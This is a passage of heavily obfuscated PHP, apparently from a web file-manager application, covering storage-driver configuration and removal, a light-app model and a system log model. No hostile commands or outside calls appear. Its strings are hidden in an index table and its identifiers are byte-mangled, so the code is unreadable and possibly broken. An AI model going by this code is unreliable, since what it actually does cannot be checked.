$…ŠµÖÖ™[$â¯Üë‡¶[830]] != $¥ªÜ÷üï) { return; } $°²ÖÇÍı = Model($â¯Üë‡¶[848])->get($â¯Üë‡¶[862]); $°²ÖÇÍı = json_decode($°²ÖÇÍı, !0); if (!$°²ÖÇÍı) { return; } $°²ÖÇÍı[$â¯Üë‡¶[830]] = $Üù³€Ÿ; Model($â¯Üë‡¶[848])->set(array($â¯Üë‡¶[862] => $°²ÖÇÍı)); } public function checkPwd($ß“¼Æà, &$ÇèÖ£Ôé) { $Éßª³¬ı =& $_SERVER[¶Ô„œ…¯]; if (empty($ÇèÖ£Ôé[$Éßª³¬ı[6]])) { return; } $¤Ú‚¬ÉÕ = $ÇèÖ£Ôé[$Éßª³¬ı[6]]; if (!is_array($¤Ú‚¬ÉÕ)) { $¤Ú‚¬ÉÕ = json_decode($¤Ú‚¬ÉÕ, !0); } $ö‹„‚™ = $Éßª³¬ı[12]; $ùê ˜ğã = array($Éßª³¬ı[2317], $Éßª³¬ı[2318], $Éßª³¬ı[973]); foreach ($ùê ˜ğã as $‚èÅÇ°µ) { if (isset($¤Ú‚¬ÉÕ[$‚èÅÇ°µ])) { $ö‹„‚™ = $‚èÅÇ°µ; break; } } if (!$ö‹„‚™) { return; } $¦¾ÛÇ°ø = $this->getConfig($ß“¼Æà); $ó»Õ¸¼ı = $¦¾ÛÇ°ø[$ö‹„‚™]; $œÛ™ß©ş = $¤Ú‚¬ÉÕ[$ö‹„‚™]; if ($œÛ™ß©ş == str_repeat($Éßª³¬ı[222], strlen($ó»Õ¸¼ı))) { $¤Ú‚¬ÉÕ[$ö‹„‚™] = $ó»Õ¸¼ı; $ÇèÖ£Ôé[$Éßª³¬ı[6]] = json_encode($¤Ú‚¬ÉÕ); } else { if ($œÛ™ß©ş != $ó»Õ¸¼ı) { $ÇèÖ£Ôé[$Éßª³¬ı[2316]] = $Éßª³¬ı[91]; } } } public function checkConfig(&$ŸâÄÛŒ, $¬¿‘•æ = false) { $›è¢ßú =& $_SERVER[¶Ô„œ…¯]; $óŸŞÂ›† = strtolower($ŸâÄÛŒ[$›è¢ßú[98]]); $´‰ÌúÖ¤ = $ŸâÄÛŒ[$›è¢ßú[6]]; if (!is_array($´‰ÌúÖ¤)) { $´‰ÌúÖ¤ = json_decode($´‰ÌúÖ¤, !0); } foreach ($´‰ÌúÖ¤ as $Û¯ğÆº => $³­õËÅ³) { if (is_string($³­õËÅ³)) { $´‰ÌúÖ¤[$Û¯ğÆº] = trim($³­õËÅ³); } } $´‰ÌúÖ¤[$›è¢ßú[2319]] = rand_string(6); $Æ´èÃ· = $GLOBALS[$›è¢ßú[6]][$›è¢ßú[92]][$›è¢ßú[904]]; $şÆïšñ­ = isset($Æ´èÃ·[$óŸŞÂ›†]) ? $Æ´èÃ·[$óŸŞÂ›†] : ucfirst($óŸŞÂ›†); $«’ŞÃàÎ = $›è¢ßú[77] . $şÆïšñ­; if (!$şÆïšñ­ || !class_exists($«’ŞÃàÎ)) { if ($¬¿‘•æ) { return LNG($›è¢ßú[2320]); } write_log(array($›è¢ßú[2321], $ŸâÄÛŒ, get_caller_info()), $›è¢ßú[215]); show_json(LNG($›è¢ßú[2320]), !1, $ŸâÄÛŒ); } $­±şäì’ = new $«’ŞÃàÎ($´‰ÌúÖ¤); if (in_array($óŸŞÂ›†, $­±şäì’->objectDriver)) { try { if (!$­±şäì’->isBucketCors() && !$­±şäì’->setBucketCors()) { $ÛËß˜¹ = LNG($›è¢ßú[2322]); $ÛËß˜¹ .= $›è¢ßú[2323] . LNG($›è¢ßú[2324]); } } catch (Exception $ûÍÔßÎş) { $ÛËß˜¹ = $ûÍÔßÎş->getMessage(); } if (isset($ÛËß˜¹)) { return $this->_parseError($ÛËß˜¹, $óŸŞÂ›†, $¬¿‘•æ); } if ($óŸŞÂ›† == $›è¢ßú[68] && !$­±şäì’->checkRegion()) { return $this->_parseError(LNG($›è¢ßú[2325]), $óŸŞÂ›†, $¬¿‘•æ); } } $€Ìã¿Ğ£ = rtrim($´‰ÌúÖ¤[$›è¢ßú[1269]], $›è¢ßú[8]) . $›è¢ßú[8]; $ş§³ÕÄ° = $­±şäì’->getPath($€Ìã¿Ğ£ . $›è¢ßú[1273]); try { if ($óŸŞÂ›† == $›è¢ßú[109]) { $­±şäì’->mkdir($€Ìã¿Ğ£); } $ş“Ù¿›¬ = $­±şäì’->mkfile($ş§³ÕÄ°); if (!$ş“Ù¿›¬) { $ÛËß˜¹ = LNG($›è¢ßú[2322]); } } catch (Exception $ûÍÔßÎş) { $ÛËß˜¹ = $ûÍÔßÎş->getMessage(); } if (isset($ÛËß˜¹)) { return $this->_parseError($ÛËß˜¹, $óŸŞÂ›†, $¬¿‘•æ); } $´‰ÌúÖ¤[$›è¢ßú[1269]] = $€Ìã¿Ğ£; $ŸâÄÛŒ[$›è¢ßú[6]] = json_encode($´‰ÌúÖ¤); $ŸâÄÛŒ[$›è¢ßú[98]] = $şÆïšñ­; return !0; } private function _parseError($èñÂ™•œ, $€üÖÚÀ‰, $ÌíÃØò = false) { $äÏ¦Û =& $_SERVER[¶Ô„œ…¯]; if ($€üÖÚÀ‰ == $äÏ¦Û[68] && stripos($èñÂ™•œ, $äÏ¦Û[2326])) { $îÖ¾ˆ¶½ = explode($äÏ¦Û[10], $èñÂ™•œ); $Åªñõş› = isset($îÖ¾ˆ¶½[1]) ? $îÖ¾ˆ¶½[1] : $äÏ¦Û[12]; $÷ˆÉ‡ÀŞ = array($äÏ¦Û[2327] => LNG($äÏ¦Û[2328]), $äÏ¦Û[2329] => LNG($äÏ¦Û[2330])); if (isset($÷ˆÉ‡ÀŞ[$Åªñõş›])) { $èñÂ™•œ = $÷ˆÉ‡ÀŞ[$Åªñõş›]; } } if (stripos($èñÂ™•œ, $äÏ¦Û[2331]) === 0) { $ï‘ •Ùê = strpos($èñÂ™•œ, $äÏ¦Û[178]); if ($ï‘ •Ùê === !1) { $ï‘ •Ùê = strpos($èñÂ™•œ, $äÏ¦Û[4]); } if ($ï‘ •Ùê !== !1) { $èñÂ™•œ = substr($èñÂ™•œ, $ï‘ •Ùê + 1); } } $èñÂ™•œ = LNG($äÏ¦Û[1276]) . $èñÂ™•œ; if ($ÌíÃØò) { return $èñÂ™•œ; } show_json($èñÂ™•œ, !1); } public function driverListSystem() { $ø¬áĞÙ– =& $_SERVER[¶Ô„œ…¯]; $µãŠÄ¿“ = parent::listData(); $î¥Ÿí‡Õ = array(); foreach ($µãŠÄ¿“ as $„ÍùÙ¾) { unset($„ÍùÙ¾[$ø¬áĞÙ–[233]], $„ÍùÙ¾[$ø¬áĞÙ–[88]]); if (!is_array($„ÍùÙ¾[$ø¬áĞÙ–[6]])) { $„ÍùÙ¾[$ø¬áĞÙ–[6]] = json_decode($„ÍùÙ¾[$ø¬áĞÙ–[6]], !0); } $î¥Ÿí‡Õ[] = $„ÍùÙ¾; } return $î¥Ÿí‡Õ; } public function defaultDriver() { $™…Ù‚ =& $_SERVER[¶Ô„œ…¯]; $Ìô€³› = parent::listData(); $€æàÃ = array_filter_by_field($Ìô€³›, $™…Ù‚[37], 1); $€æàÃ = $€æàÃ[0]; if (!$€æàÃ) { return array(); } if (!is_array($€æàÃ[$™…Ù‚[6]])) { $€æàÃ[$™…Ù‚[6]] = json_decode($€æàÃ[$™…Ù‚[6]], !0); } return $€æàÃ; } public function driverInfo($½ôÚ¼¿Á) { $¬Æ«›€ =& $_SERVER[¶Ô„œ…¯]; $¿¾ğ¹Œ = array_to_keyvalue(parent::listData(), $¬Æ«›€[477]); if (!isset($¿¾ğ¹Œ[$½ôÚ¼¿Á])) { return !1; } $ÑÂ’Ï× = $¿¾ğ¹Œ[$½ôÚ¼¿Á]; if (!is_array($ÑÂ’Ï×[$¬Æ«›€[6]])) { $ÑÂ’Ï×[$¬Æ«›€[6]] = json_decode($ÑÂ’Ï×[$¬Æ«›€[6]], !0); } return $ÑÂ’Ï×; } public function remove($ÃÜùÑ¹ñ) { $this->removeShareItems($ÃÜùÑ¹ñ); return parent::remove($ÃÜùÑ¹ñ); } public function removeWithFile($ÚÇñ à–, $êÓ“Â˜”, $Ë´áÍçä, $æÅ˜‹Ñ– = false) { $ôÅ¡÷íÄ =& $_SERVER[¶Ô„œ…¯]; $á€ˆ¸ß´ = array($ôÅ¡÷íÄ[896] => $ÚÇñ à–); $óçëŒç‹ = Model($ôÅ¡÷íÄ[546])->where($á€ˆ¸ß´)->count(); $†™œÒùë = Model($ôÅ¡÷íÄ[546])->where($á€ˆ¸ß´)->sum($ôÅ¡÷íÄ[79]); $˜Ü«“¶æ = $êÓ“Â˜” . $ôÅ¡÷íÄ[2332] . $ÚÇñ à–; $ÍÄ¨•‡’ = LNG($êÓ“Â˜” == $ôÅ¡÷íÄ[625] ? $ôÅ¡÷íÄ[2333] : $ôÅ¡÷íÄ[2334]); $ÓŞ›ô½ = new TaskFileTransfer($˜Ü«“¶æ, $ôÅ¡÷íÄ[215], $óçëŒç‹, $ÍÄ¨•‡’ . $ôÅ¡÷íÄ[464] . $Ë´áÍçä[$ôÅ¡÷íÄ[32]] . $ôÅ¡÷íÄ[214] . $ÚÇñ à–); $ÓŞ›ô½->task[$ôÅ¡÷íÄ[841]] = (double) $†™œÒùë; $æì¾·â† = KodIO::defaultDriver(); $…Î“¡ÅÏ = $æì¾·â†[$ôÅ¡÷íÄ[477]]; $³ÕŞãÀ = $ĞíÔäÍë = $¿Ö»úßğ = array(); $¦¼íÂıõ = Model($ôÅ¡÷íÄ[232])->where($á€ˆ¸ß´)->field($ôÅ¡÷íÄ[2335])->select(); foreach ($¦¼íÂıõ as $Ûâ®è“û) { $İÅèÒı˜ = $Ûâ®è“û[$ôÅ¡÷íÄ[543]]; if ($æÅ˜‹Ñ–) { $ĞíÔäÍë[] = $İÅèÒı˜; continue; } $Òû‹Ã°Á = $Ûâ®è“û[$ôÅ¡÷íÄ[87]]; $²Œ›öÏ = get_path_father($Òû‹Ã°Á); $¿Ö»úßğ[] = $²Œ›öÏ; $²Œ›öÏ = str_replace("\x7b\151\157\x3a{$ÚÇñ à–}\x7d\x2f", "\173\x69\157\x3a{$…Î“¡ÅÏ}\175\x2f", $²Œ›öÏ); if (!IO::exist($Òû‹Ã°Á)) { $³ÕŞãÀ[] = $İÅèÒı˜; $ÓŞ›ô½->updateFileEnd($Ûâ®è“û[$ôÅ¡÷íÄ[32]], $Ûâ®è“û[$ôÅ¡÷íÄ[79]]); write_log($ôÅ¡÷íÄ[2336] . $Òû‹Ã°Á, $ôÅ¡÷íÄ[1911]); continue; } $·Ö Úã™ = IO::move($Òû‹Ã°Á, $²Œ›öÏ, REPEAT_RENAME); if (!$·Ö Úã™) { $ĞíÔäÍë[] = $İÅèÒı˜; $ÓŞ›ô½->updateFileEnd($Ûâ®è“û[$ôÅ¡÷íÄ[32]], $Ûâ®è“û[$ôÅ¡÷íÄ[79]]); write_log($ôÅ¡÷íÄ[2337] . $Òû‹Ã°Á, $ôÅ¡÷íÄ[1911]); continue; } $á€ˆ¸ß´ = array($ôÅ¡÷íÄ[543] => $İÅèÒı˜); $µ‘–¶º© = array($ôÅ¡÷íÄ[896] => $…Î“¡ÅÏ, $ôÅ¡÷íÄ[87] => $·Ö Úã™); Model($ôÅ¡÷íÄ[232])->where($á€ˆ¸ß´)->save($µ‘–¶º©); } $†â÷Ñ—° = $ÓŞ›ô½->task; if (!$æÅ˜‹Ñ–) { Cache::set($˜Ü«“¶æ, $†â÷Ñ—°); } $ÓŞ›ô½->end(); $³ÕŞãÀ = array_unique($³ÕŞãÀ); $ĞíÔäÍë = array_unique($ĞíÔäÍë); if (!$æÅ˜‹Ñ– && ($³ÕŞãÀ || $ĞíÔäÍë)) { $ê³Éù¶¦ = array(); if ($³ÕŞãÀ) { $ê³Éù¶¦[] = sprintf(LNG($ôÅ¡÷íÄ[2338]), count($³ÕŞãÀ)); } if ($ĞíÔäÍë) { $ê³Éù¶¦[] = sprintf(LNG($ôÅ¡÷íÄ[2339]), count($ĞíÔäÍë)); } $ê³Éù¶¦ = sprintf(LNG($ôÅ¡÷íÄ[2340]), implode($ôÅ¡÷íÄ[2341], $ê³Éù¶¦)) . $ôÅ¡÷íÄ[2342] . date($ôÅ¡÷íÄ[2343]) . $ôÅ¡÷íÄ[2344]; if ($êÓ“Â˜” == $ôÅ¡÷íÄ[1948]) { $ê³Éù¶¦ .= $ôÅ¡÷íÄ[2345] . LNG($ôÅ¡÷íÄ[2346]); } else { $ê³Éù¶¦ = LNG($ôÅ¡÷íÄ[2347]) . $ôÅ¡÷íÄ[2348] . $ê³Éù¶¦; } $†â÷Ñ—°[$ôÅ¡÷íÄ[1271]] = $ê³Éù¶¦; Cache::set($˜Ü«“¶æ, $†â÷Ñ—°); unset($Ë´áÍçä[$ôÅ¡÷íÄ[6]]); $°§ç¬·š = array($ôÅ¡÷íÄ[477] => $ÚÇñ à–, $ôÅ¡÷íÄ[2219] => $ôÅ¡÷íÄ[625], $ôÅ¡÷íÄ[32] => $Ë´áÍçä[$ôÅ¡÷íÄ[32]], $ôÅ¡÷íÄ[98] => $Ë´áÍçä[$ôÅ¡÷íÄ[98]]); Hook::trigger($ôÅ¡÷íÄ[1791], array($ôÅ¡÷íÄ[1294] => $°§ç¬·š, $ôÅ¡÷íÄ[1304] => !0)); show_json($ê³Éù¶¦, !1, 100111); } if ($êÓ“Â˜” == $ôÅ¡÷íÄ[625]) { return !0; } if ($³ÕŞãÀ || $ĞíÔäÍë) { $ÎÏó–İ¤ = array_merge($³ÕŞãÀ, $ĞíÔäÍë); $ÎÏó–İ¤ = array_filter(array_unique($ÎÏó–İ¤)); $this->removeByFileID($ÎÏó–İ¤); } if ($¿Ö»úßğ) { $¿Ö»úßğ = array_filter(array_unique($¿Ö»úßğ)); foreach ($¿Ö»úßğ as $Òû‹Ã°Á) { $úÄ¥³ = IO::has($Òû‹Ã°Á, !0); if (!$úÄ¥³[$ôÅ¡÷íÄ[241]] && !$úÄ¥³[$ôÅ¡÷íÄ[242]]) { IO::remove($Òû‹Ã°Á); } } } return $this->remove($ÚÇñ à–); } private function removeByFileID($ŞöÂ³¿» = array()) { $È•ÙÓ§ =& $_SERVER[¶Ô„œ…¯]; if (empty($ŞöÂ³¿»)) { return; } $Å±®² = array($È•ÙÓ§[543] => array($È•ÙÓ§[7], $ŞöÂ³¿»)); $âú‚úïú = Model($È•ÙÓ§[1428])->where($Å±®²)->field($È•ÙÓ§[193])->select(); if (!$âú‚úïú) { return Model($È•ÙÓ§[546])->remove($ŞöÂ³¿»); } $âú‚úïú = array_to_keyvalue($âú‚úïú, $È•ÙÓ§[12], $È•ÙÓ§[193]); foreach ($âú‚úïú as $€¯Å°’™) { Model($È•ÙÓ§[903])->removeNow($€¯Å°’™, !1); } } private function removeShareItems($ÎÅ¶†Ş) { $ŒìâŸ´Ü =& $_SERVER[¶Ô„œ…¯]; $‰İ¸µÙÌ = "\173\151\x6f\72{$ÎÅ¶†Ş}\175\57"; $­éÄ…¥¶ = array($ŒìâŸ´Ü[193] => 0, $ŒìâŸ´Ü[1264] => array($ŒìâŸ´Ü[461], "{$‰İ¸µÙÌ}\45")); $¼Öá³• = Model($ŒìâŸ´Ü[1959])->where($­éÄ…¥¶)->field($ŒìâŸ´Ü[670])->select(); if (empty($¼Öá³•)) { return; } $Ò·àâ…ª = array_to_keyvalue($¼Öá³•, $ŒìâŸ´Ü[12], $ŒìâŸ´Ü[670]); Model($ŒìâŸ´Ü[669])->remove($Ò·àâ…ª); } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\x2e\x4c\x69\147\150\164\x41\x70\160"; public $modelType = "\x53\171\163\164\145\x6d\117\160\164\151\x6f\156"; public $field = array("\x6e\141\155\145", "\x67\x72\x6f\x75\x70", "\x64\145\x73\x63", "\143\x6f\x6e\164\145\156\x74"); public function listData($ïŒÍÏÊ× = false, $óø›èôÉ = "\x6d\157\144\151\146\171\124\x69\x6d\x65", $ë¢õ ö½ = true) { return parent::listData($ïŒÍÏÊ×, $óø›èôÉ, $ë¢õ ö½); } public function remove($ƒÖ¯û›‡) { $á»“„êï = $this->findByName($ƒÖ¯û›‡); if (!$á»“„êï) { return !1; } return parent::remove($á»“„êï[$_SERVER[¶Ô„œ…¯][477]]); } public function add($€İš¹ëÉ) { if ($this->findByName($€İš¹ëÉ[$_SERVER[¶Ô„œ…¯][32]])) { return !1; } return parent::insert($€İš¹ëÉ); } public function update($¤ıà¥Ñ”, $ÎöìŸí¤) { $ã–Øèá =& $_SERVER[¶Ô„œ…¯]; $¶¢”Æ¶„ = $this->findByName($¤ıà¥Ñ”); $«³ï¦ïè = $this->findByName($ÎöìŸí¤[$ã–Øèá[32]]); if (!$¶¢”Æ¶„ || $«³ï¦ïè && $«³ï¦ïè[$ã–Øèá[477]] != $¶¢”Æ¶„[$ã–Øèá[477]]) { return !1; } return parent::update($¶¢”Æ¶„[$ã–Øèá[477]], $ÎöìŸí¤); } } class SystemLogModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\145\x6d\x5f\154\157\x67"; protected $dataAuto = array(array("\x63\x72\x65\141\164\x65\124\151\155\x65", "\x74\151\155\145", "\x69\156\163\x65\x72\x74", "\146\x75\156\x63\x74\x69\x6f\x6e")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->typeListAll(); } public function typeListAll() { $»‹‘†ÑÛ =& $_SERVER[¶Ô„œ…¯]; return array($»‹‘†ÑÛ[2349] => LNG($»‹‘†ÑÛ[2350]), $»‹‘†ÑÛ[2351] => LNG($»‹‘†ÑÛ[2352]), $»‹‘†ÑÛ[1922] => LNG($»‹‘†ÑÛ[2353]), $»‹‘†ÑÛ[2354] => LNG($»‹‘†ÑÛ[2355]), $»‹‘†ÑÛ[2356] => LNG($»‹‘†ÑÛ[2357]), $»‹‘†ÑÛ[2358] => LNG($»‹‘†ÑÛ[2359]), $»‹‘†ÑÛ[2360] => LNG($»‹‘†ÑÛ[2361]), $»‹‘†ÑÛ[1952] => LNG($»‹‘†ÑÛ[2361]), $»‹‘†ÑÛ[1953] => LNG($»‹‘†ÑÛ[2362]), $»‹‘†ÑÛ[2363] => LNG($»‹‘†ÑÛ[2364]), $»‹‘†ÑÛ[2365] => LNG($»‹‘†ÑÛ[2366]), $»‹‘†ÑÛ[2367] => LNG($»‹‘†ÑÛ[2368]), $»‹‘†ÑÛ[2369] => LNG($»‹‘†ÑÛ[2370]), $»‹‘†ÑÛ[1950] => LNG($»‹‘†ÑÛ[2371]), $»‹‘†ÑÛ[2372] => LNG($»‹‘†ÑÛ[2373]), $»‹‘†ÑÛ[1957] => LNG($»‹‘†ÑÛ[2374]), $»‹‘†ÑÛ[2375] => LNG($»‹‘†ÑÛ[2376]), $»‹‘†ÑÛ[2377] => LNG($»‹‘†ÑÛ[2378]), $»‹‘†ÑÛ[2379] => LNG($»‹‘†ÑÛ[2380]), $»‹‘†ÑÛ[2381] => LNG($»‹‘†ÑÛ[2382]), $»‹‘†ÑÛ[1960] => LNG($»‹‘†ÑÛ[2383]), $»‹‘†ÑÛ[1961] => LNG($»‹‘†ÑÛ[2384]), $»‹‘†ÑÛ[2385] => LNG($»‹‘†ÑÛ[2386]), $»‹‘†ÑÛ[2387] => LNG($»‹‘†ÑÛ[2388]), $»‹‘†ÑÛ[2389] => LNG($»‹‘†ÑÛ[2390]), $»‹‘†ÑÛ[1955] => LNG($»‹‘†ÑÛ[2391]), $»‹‘†ÑÛ[2392] => LNG($»‹‘†ÑÛ[2393]), $»‹‘†ÑÛ[1954] => LNG($»‹‘†ÑÛ[2394]), $»‹‘†ÑÛ[2395] => LNG($»‹‘†ÑÛ[2396]), $»‹‘†ÑÛ[2397] => LNG($»‹‘†ÑÛ[2398]), $»‹‘†ÑÛ[2399] => LNG($»‹‘†ÑÛ[2398]), $»‹‘†ÑÛ[2400] => LNG($»‹‘†ÑÛ[2401]), $»‹‘†ÑÛ[2402] => LNG($»‹‘†ÑÛ[2402]), $»‹‘†ÑÛ[2403] => LNG($»‹‘†ÑÛ[1926]), $»‹‘†ÑÛ[2404] => LNG($»‹‘†ÑÛ[2405]), $»‹‘†ÑÛ[2406] => LNG($»‹‘†ÑÛ[2407]), $»‹‘†ÑÛ[2408] => LNG($»‹‘†ÑÛ[2409]), $»‹‘†ÑÛ[2410] => LNG($»‹‘†ÑÛ[2411]), $»‹‘†ÑÛ[2412] => LNG($»‹‘†ÑÛ[2413]), $»‹‘†ÑÛ[2414] => LNG($»‹‘†ÑÛ[2414]), $»‹‘†ÑÛ[2415] => LNG($»‹‘†ÑÛ[2416]), $»‹‘†ÑÛ[2417] => LNG($»‹‘†ÑÛ[2418]), $»‹‘†ÑÛ[2419] => LNG($»‹‘†ÑÛ[2420]), $»‹‘†ÑÛ[2421] => LNG($»‹‘†ÑÛ[2422]), $»‹‘†ÑÛ[2423] => LNG($»‹‘†ÑÛ[2424]), $»‹‘†ÑÛ[2425] => LNG($»‹‘†ÑÛ[2426]), $»‹‘†ÑÛ[212] => LNG($»‹‘†ÑÛ[212]), $»‹‘†ÑÛ[213] => LNG($»‹‘†ÑÛ[2427]), $»‹‘†ÑÛ[2428] => LNG($»‹‘†ÑÛ[2428])); } private function typeFile() { $ÏÒ˜¯Îú =& $_SERVER[¶Ô„œ…¯]; $ã‡¸Ñà = array($ÏÒ˜¯Îú[1957] => array($ÏÒ˜¯Îú[1958]), $ÏÒ˜¯Îú[2367] => array($ÏÒ˜¯Îú[2429]), $ÏÒ˜¯Îú[2369] => array($ÏÒ˜¯Îú[2430]), $ÏÒ˜¯Îú[1950] => array($ÏÒ˜¯Îú[1951], $ÏÒ˜¯Îú[2431]), $ÏÒ˜¯Îú[2377] => array(), $ÏÒ˜¯Îú[2379] => array(), $ÏÒ˜¯Îú[2381] => array(), $ÏÒ˜¯Îú[1960] => array($ÏÒ˜¯Îú[1962]), $ÏÒ˜¯Îú[1961] => array($ÏÒ˜¯Îú[1962]), $ÏÒ˜¯Îú[2385] => array($ÏÒ˜¯Îú[2432]), $ÏÒ˜¯Îú[2387] => array($ÏÒ˜¯Îú[2432]), $ÏÒ˜¯Îú[2389] => array($ÏÒ˜¯Îú[2433]), $ÏÒ˜¯Îú[2375] => array($ÏÒ˜¯Îú[2434]), $ÏÒ˜¯Îú[1955] => array($ÏÒ˜¯Îú[2435]), $ÏÒ˜¯Îú[2392] => array($ÏÒ˜¯Îú[2436]), $ÏÒ˜¯Îú[1954] => array($ÏÒ˜¯Îú[1956])); return $ã‡¸Ñà; } private function typeAll() { $›À¯„ÕÂ =& $_SERVER[¶Ô„œ…¯]; $ÆœÓü„¶ = $this->typeList; $Ûåç‚÷Ë = array_filter($this->typeFile()); foreach ($Ûåç‚÷Ë as $ºİ’ô’œ => $ÇÅ¸ºĞô) { $ÆœÓü„¶[$ÇÅ¸ºĞô[0]] = $ÆœÓü„¶[$ºİ’ô’œ]; } $ÆœÓü„¶[$›À¯„ÕÂ[1962]] = LNG($›À¯„ÕÂ[2437]); $ÆœÓü„¶[$›À¯„ÕÂ[2432]] = LNG($›À¯„ÕÂ[2438]); return $ÆœÓü„¶; } public function addLog($â×ä˜—Ò, $ŸÇÑŞÁÇ = array()) { $ëµ†²Ë¯ =& $_SERVER[¶Ô„œ…¯]; if (!isset($this->typeList[$â×ä˜—Ò])) { return; } $µ”ù»Ê½ = Session::get($ëµ†²Ë¯[2121]); if (!$µ”ù»Ê½) { $µ”ù»Ê½ = _get($ŸÇÑŞÁÇ, $ëµ†²Ë¯[1780], 0); } if ($â×ä˜—Ò == $ëµ†²Ë¯[2404] && is_array($ŸÇÑŞÁÇ[$ëµ†²Ë¯[2439]]) && !$ŸÇÑŞÁÇ[$ëµ†²Ë¯[2439]]) { return; } $û¯î§‘¡ = get_client_ip(); if (!$ŸÇÑŞÁÇ || strlen(json_encode($ŸÇÑŞÁÇ)) >= 1024 * 64) { if ($ŸÇÑŞÁÇ && is_array($ŸÇÑŞÁÇ)) { $ŸÇÑŞÁÇ = array_intersect_key($ŸÇÑŞÁÇ, array_flip($ëµ†²Ë¯[477], $ëµ†²Ë¯[32])); $ŸÇÑŞÁÇ[$ëµ†²Ë¯[2440]] = $û¯î§‘¡; } else { $ŸÇÑŞÁÇ = array($ëµ†²Ë¯[2440] => $û¯î§‘¡); } } else { if (is_array($ŸÇÑŞÁÇ)) { $ŸÇÑŞÁÇ[$ëµ†²Ë¯[2440]] = $û¯î§‘¡; } else { $ŸÇÑŞÁÇ = array($ëµ†²Ë¯[1294] => $ŸÇÑŞÁÇ, $ëµ†²Ë¯[2440] => $û¯î§‘¡); } } $ŸÇÑŞÁÇ = array($ëµ†²Ë¯[1770] => Session::sign(), $ëµ†²Ë¯[1771] => intval($µ”ù»Ê½), $ëµ†²Ë¯[33] => $â×ä˜—Ò, $ëµ†²Ë¯[1773] => json_encode($ŸÇÑŞÁÇ)); return parent::add($ŸÇÑŞÁÇ); } public function remove($ÔÔâÆ–„) { $this->where(array($_SERVER[¶Ô„œ…¯][495] => $ÔÔâÆ–„))->delete(); } private function _makeOrder($„×§¬òĞ = '') { $ğ•áƒŞ =& $_SERVER[¶Ô„œ…¯]; $µÃ™Ö¯ = $ğ•áƒŞ[233]; $…¿©¬‹ = array($ğ•áƒŞ[525] => $ğ•áƒŞ[526], $ğ•áƒŞ[527] => $ğ•áƒŞ[528]); $¤æÚ«êŸ = Input::get($ğ•áƒŞ[533], $ğ•áƒŞ[7], $ğ•áƒŞ[2158], array($ğ•áƒŞ[2075], $ğ•áƒŞ[527])); $¤æÚ«êŸ = $…¿©¬‹[$¤æÚ«êŸ]; $„×§¬òĞ = $„×§¬òĞ . "{$µÃ™Ö¯}\x20{$¤æÚ«êŸ}"; return $this->order($„×§¬òĞ); } public function get($¤Şœ«Éõ = '') { $©ŒÌÛÅó =& $_SERVER[¶Ô„œ…¯]; if (!$¤Şœ«Éõ) { show_json(array()); } $ÙÏüÕğ” = array(); if ($¤Şœ«Éõ[$©ŒÌÛÅó[1780]]) { $ÙÏüÕğ”[$©ŒÌÛÅó[1780]] = $¤Şœ«Éõ[$©ŒÌÛÅó[1780]]; } if (isset($¤Şœ«Éõ[$©ŒÌÛÅó[838]])) { $ãÉë¦Õº = $¤Şœ«Éõ[$©ŒÌÛÅó[838]]; $öì¢°´ = isset($¤Şœ«Éõ[$©ŒÌÛÅó[839]]) ? $¤Şœ«Éõ[$©ŒÌÛÅó[839]] : time(); $ÙÏüÕğ”[$©ŒÌÛÅó[233]] = array($©ŒÌÛÅó[410], array($ãÉë¦Õº, $öì¢°´)); } if ($¤Şœ«Éõ[$©ŒÌÛÅó[33]]) { $ê£Ûš‚¾ = explode($©ŒÌÛÅó[50], $¤Şœ«Éõ[$©ŒÌÛÅó[33]]); $È™éóˆ = $this->typeFile(); $§„€“·Æ = array(); foreach ($ê£Ûš‚¾ as $¿ÄÄÔ›») { $§„€“·Æ[] = $¿ÄÄÔ›»; if (isset($È™éóˆ[$¿ÄÄÔ›»])) { $§„€“·Æ = array_merge($§„€“·Æ, $È™éóˆ[$¿ÄÄÔ›»]); } } $§„€“·Æ = array_unique($§„€“·Æ); if ($§„€“·Æ) { $ÙÏüÕğ”[$©ŒÌÛÅó[33]] = array($©ŒÌÛÅó[7], $§„€“·Æ); } } else { $ÙÏüÕğ”[$©ŒÌÛÅó[33]] = array($©ŒÌÛÅó[2441], $©ŒÌÛÅó[2442]); } if (!empty($¤Şœ«Éõ[$©ŒÌÛÅó[2440]])) { $ÙÏüÕğ”[$©ŒÌÛÅó[528]] = array($©ŒÌÛÅó[461], "\x25{$¤Şœ«Éõ[$©ŒÌÛÅó[2440]]}\x25"); } $æ¸Ù¢â€ = $this->_makeOrder()->where($ÙÏüÕğ”)->selectPage(); if (empty($æ¸Ù¢â€[$©ŒÌÛÅó[447]])) { show_json(array(), !0, $æ¸Ù¢â€[$©ŒÌÛÅó[444]]); } $æ¸Ù¢â€[$©ŒÌÛÅó[447]] = $this->logList($æ¸Ù¢â€[$©ŒÌÛÅó[447]]); return $æ¸Ù¢â€; } private function ipAddress(&$¦ö€ÓÉí) { $¥³Èîß¿ =& $_SERVER[¶Ô„œ…¯]; if (!empty($¦ö€ÓÉí[$¥³Èîß¿[2440]])) { $ÒĞÚ°”² = IpLocation::get($¦ö€ÓÉí[$¥³Èîß¿[2440]]); } else { $ÒĞÚ°”² = LNG($¥³Èîß¿[2443]); } $¦ö€ÓÉí[$¥³Èîß¿[2444]] = $ÒĞÚ°”²; } private function descZipDownload($ûå–¶¨, &$“›ƒ§Ñ¤) { $óëÅ•«¬ =& $_SERVER[¶Ô„œ…¯]; if (!isset($ûå–¶¨[$óëÅ•«¬[2445]])) { return; } $áîóçĞ = json_decode($ûå–¶¨[$óëÅ•«¬[2445]], !0); foreach ($áîóçĞ as $û‘óÅşÔ) { try { $Î÷æÉ­¿ = IO::infoFullSimple($û‘óÅşÔ[$óëÅ•«¬[87]]); } catch (Exception $š¡ñ¹ªû) { continue; } $ûå–¶¨[$óëÅ•«¬[87]] = $û‘óÅşÔ[$óëÅ•«¬[87]]; $“›ƒ§Ñ¤[] = $ûå–¶¨[$óëÅ•«¬[193]] = $Î÷æÉ­¿[$óëÅ•«¬[193]]; $“›ƒ§Ñ¤[] = $ûå–¶¨[$óëÅ•«¬[2214]] = $Î÷æÉ­¿[$óëÅ•«¬[192]]; break; } return $ûå–¶¨; } private function getSourceList(&$ëíØÍÜ) { $¥óÛü» =& $_SERVER[¶Ô„œ…¯]; $Çï¼øÉˆ = array(); foreach ($ëíØÍÜ as $ññÕ‘¹Æ => $¿¾Õä×) { $ÇàÌ®Á = 